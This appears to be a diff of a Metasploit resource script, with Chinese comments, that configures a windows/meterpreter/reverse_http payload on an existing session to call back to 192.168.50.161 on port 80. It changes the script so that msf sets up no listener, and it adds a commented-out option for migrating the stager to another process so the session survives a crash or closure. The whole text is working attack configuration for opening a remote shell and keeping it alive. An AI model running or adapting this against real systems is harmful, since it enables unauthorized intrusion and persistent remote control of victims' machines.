@@ -3,5 +3,7 @@ set payload windows/meterpreter/reverse_http
 set session 4
 set LHOST 192.168.50.161
 set LPORT 80
-# set DisablePayloadHandler True # 不再建立监听器
+# msf不创建监听
+set DisablePayloadHandler True
+# set PrependMigrate True # 修改其 stager 以在利用后立即迁移到另一个进程, 如果被程序崩溃或关闭，会话继续存在。
 run
